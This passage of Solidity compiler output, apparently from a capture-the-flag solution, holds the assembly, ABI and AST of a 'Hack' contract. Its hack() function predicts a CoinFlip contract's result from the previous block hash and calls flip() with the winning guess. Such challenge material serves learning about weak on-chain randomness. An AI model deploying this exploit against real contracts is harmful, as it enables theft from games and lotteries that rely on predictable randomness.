									"end": 663,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 137,
									"end": 663,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 137,
									"end": 663,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 137,
									"end": 663,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 137,
									"end": 663,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 137,
									"end": 663,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a26469706673582212205c7fb7473ea06eeeedfa76cfbba109d63d51ce78a2b312bd7e7fa33dfbe80a6464736f6c634300060c0033",
									".code": [
										{
											"begin": 137,
											"end": 663,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 137,
											"end": 663,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 137,
											"end": 663,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 137,
											"end": 663,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 137,
											"end": 663,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 137,
											"end": 663,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 137,
											"end": 663,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 137,
											"end": 663,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 137,
											"end": 663,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 137,
											"end": 663,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 137,
											"end": 663,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 137,
											"end": 663,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 137,
											"end": 663,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 137,
											"end": 663,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 137,
											"end": 663,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 137,
											"end": 663,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 137,
											"end": 663,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 137,
											"end": 663,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 137,
											"end": 663,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 137,
											"end": 663,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 137,
											"end": 663,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 137,
											"end": 663,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 137,
											"end": 663,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 137,
											"end": 663,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 137,
											"end": 663,
											"name": "PUSH",
											"source": 0,
											"value": "4DE260A2"
										},
										{
											"begin": 137,
											"end": 663,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 137,
											"end": 663,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 137,
											"end": 663,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 137,
											"end": 663,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 137,
											"end": 663,
											"name": "PUSH",
											"source": 0,
											"value": "8475C028"
										},
										{
											"begin": 137,
											"end": 663,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 137,
											"end": 663,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 137,
											"end": 663,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 137,
											"end": 663,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 137,
											"end": 663,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 137,
											"end": 663,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 137,
											"end": 663,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 137,
											"end": 663,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 425,
											"end": 660,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 425,
											"end": 660,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 425,
											"end": 660,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 425,
											"end": 660,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 425,
											"end": 660,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 425,
											"end": 660,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 425,
											"end": 660,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 425,
											"end": 660,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 319,
											"end": 335,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 319,
											"end": 335,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 319,
											"end": 335,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 319,
											"end": 335,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 319,
											"end": 335,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 319,
											"end": 335,
											"name": "tag",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 319,
											"end": 335,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 319,
											"end": 335,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 319,
											"end": 335,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 319,
											"end": 335,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 319,
											"end": 335,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 319,
											"end": 335,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 319,
											"end": 335,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 319,
											"end": 335,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 319,
											"end": 335,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 319,
											"end": 335,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 319,
											"end": 335,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 319,
											"end": 335,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 319,
											"end": 335,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 319,
											"end": 335,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 319,
											"end": 335,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 319,
											"end": 335,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 319,
											"end": 335,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 319,
											"end": 335,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 319,
											"end": 335,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 319,
											"end": 335,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 319,
											"end": 335,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 425,
											"end": 660,
											"name": "tag",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 425,
											"end": 660,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 457,
											"end": 475,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 510,
											"end": 511,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 496,
											"end": 508,
											"name": "NUMBER",
											"source": 0
										},
										{
											"begin": 496,
											"end": 511,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 486,
											"end": 512,
											"name": "BLOCKHASH",
											"source": 0
										},
										{
											"begin": 478,
											"end": 513,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 478,
											"end": 513,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 457,
											"end": 513,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 457,
											"end": 513,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 523,
											"end": 539,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 571,
											"end": 577,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 571,
											"end": 577,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 558,
											"end": 568,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 550,
											"end": 577,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 550,
											"end": 577,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 550,
											"end": 577,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 550,
											"end": 577,
											"name": "INVALID",
											"source": 0
										},
										{
											"begin": 550,
											"end": 577,
											"name": "tag",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 550,
											"end": 577,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 550,
											"end": 577,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 523,
											"end": 578,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 523,
											"end": 578,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 607,
											"end": 608,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 595,
											"end": 603,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 595,
											"end": 608,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 595,
											"end": 623,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 595,
											"end": 623,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 618,
											"end": 623,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 595,
											"end": 623,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 595,
											"end": 623,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 595,
											"end": 623,
											"name": "tag",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 595,
											"end": 623,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 611,
											"end": 615,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 595,
											"end": 623,
											"name": "tag",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 595,
											"end": 623,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 588,
											"end": 592,
											"name": "PUSH",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 588,
											"end": 592,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 588,
											"end": 623,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 588,
											"end": 623,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 588,
											"end": 623,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 588,
											"end": 623,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 588,
											"end": 623,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 588,
											"end": 623,
											"name": "PUSH",
											"source": 0,
											"value": "FF"
										},
										{
											"begin": 588,
											"end": 623,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 588,
											"end": 623,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 588,
											"end": 623,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 588,
											"end": 623,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 588,
											"end": 623,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 588,
											"end": 623,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 588,
											"end": 623,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 588,
											"end": 623,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 588,
											"end": 623,
											"name": "OR",
											"source": 0
										},
										{
											"begin": 588,
											"end": 623,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 588,
											"end": 623,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 588,
											"end": 623,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 633,
											"end": 642,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 633,
											"end": 642,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 633,
											"end": 642,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 633,
											"end": 642,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 633,
											"end": 642,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 633,
											"end": 642,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 633,
											"end": 642,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 633,
											"end": 642,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 633,
											"end": 642,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 633,
											"end": 642,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 633,
											"end": 647,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 633,
											"end": 647,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 633,
											"end": 647,
											"name": "PUSH",
											"source": 0,
											"value": "1D263F67"
										},
										{
											"begin": 648,
											"end": 652,
											"name": "PUSH",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 648,
											"end": 652,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 648,
											"end": 652,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 648,
											"end": 652,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 648,
											"end": 652,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 648,
											"end": 652,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 648,
											"end": 652,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 648,
											"end": 652,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 648,
											"end": 652,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 648,
											"end": 652,
											"name": "PUSH",
											"source": 0,
											"value": "FF"
										},
										{
											"begin": 648,
											"end": 652,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 633,
											"end": 653,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFF"
										},
										{
											"begin": 633,
											"end": 653,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 633,
											"end": 653,
											"name": "SHL",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 633,
											"end": 653,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 633,
											"end": 653,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 633,
											"end": 653,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 633,
											"end": 653,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 633,
											"end": 653,
											"name": "DUP8",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "EXTCODESIZE",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 633,
											"end": 653,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 633,
											"end": 653,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "tag",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 633,
											"end": 653,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "GAS",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 633,
											"end": 653,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 633,
											"end": 653,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "RETURNDATACOPY",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 633,
											"end": 653,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "tag",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 633,
											"end": 653,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 633,
											"end": 653,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 633,
											"end": 653,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 633,
											"end": 653,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 633,
											"end": 653,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "tag",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 633,
											"end": 653,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 633,
											"end": 653,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 633,
											"end": 653,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 425,
											"end": 660,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 425,
											"end": 660,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 425,
											"end": 660,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 319,
											"end": 335,
											"name": "tag",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 319,
											"end": 335,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 319,
											"end": 335,
											"name": "PUSH",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 319,
											"end": 335,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 319,
											"end": 335,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 319,
											"end": 335,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 319,
											"end": 335,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 319,
											"end": 335,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 319,
											"end": 335,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 319,
											"end": 335,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 319,
											"end": 335,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 319,
											"end": 335,
											"name": "PUSH",
											"source": 0,
											"value": "FF"
										},
										{
											"begin": 319,
											"end": 335,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 319,
											"end": 335,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 319,
											"end": 335,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"hack()": "4de260a2",
							"side()": "8475c028"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.12+commit.27d51765\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"hack\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"side\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"CoinFlip.sol\":\"Hack\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"CoinFlip.sol\":{\"keccak256\":\"0xb7eb5b7b3710132effcc08a13314f81663cc09518e4b8be33f3fac8d22392b0f\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://636b6019b0546f87ee55618dea68ecfff1d15e1f2e7e54db54eeeefa9b85dce2\",\"dweb:/ipfs/Qmf6bDw4J13YiXMaJHviTVaDPX5A4bVi6uup7Pt25girzz\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 11,
								"contract": "CoinFlip.sol:Hack",
								"label": "coin_flip",
								"offset": 0,
								"slot": "0",
								"type": "t_contract(CoinFlip)9"
							},
							{
								"astId": 14,
								"contract": "CoinFlip.sol:Hack",
								"label": "FACTOR",
								"offset": 0,
								"slot": "1",
								"type": "t_uint256"
							},
							{
								"astId": 16,
								"contract": "CoinFlip.sol:Hack",
								"label": "side",
								"offset": 0,
								"slot": "2",
								"type": "t_bool"
							}
						],
						"types": {
							"t_bool": {
								"encoding": "inplace",
								"label": "bool",
								"numberOfBytes": "1"
							},
							"t_contract(CoinFlip)9": {
								"encoding": "inplace",
								"label": "contract CoinFlip",
								"numberOfBytes": "20"
							},
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"sources": {
			"CoinFlip.sol": {
				"ast": {
					"absolutePath": "CoinFlip.sol",
					"exportedSymbols": {
						"CoinFlip": [
							9
						],
						"Hack": [
							72
						]
					},
					"id": 73,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.6",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "0:23:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": null,
							"fullyImplemented": false,
							"id": 9,
							"linearizedBaseContracts": [
								9
							],
							"name": "CoinFlip",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": null,
									"documentation": null,
									"functionSelector": "1d263f67",
									"id": 8,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "flip",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 4,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 3,
												"mutability": "mutable",
												"name": "_guess",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 8,
												"src": "96:11:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 2,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "96:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "95:13:0"
									},
									"returnParameters": {
										"id": 7,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 6,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 8,
												"src": "127:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 5,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "127:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "126:6:0"
									},
									"scope": 9,
									"src": "82:51:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 73,
							"src": "58:77:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 72,
							"linearizedBaseContracts": [
								72
							],
							"name": "Hack",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"id": 11,
									"mutability": "mutable",
									"name": "coin_flip",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 72,
									"src": "156:18:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
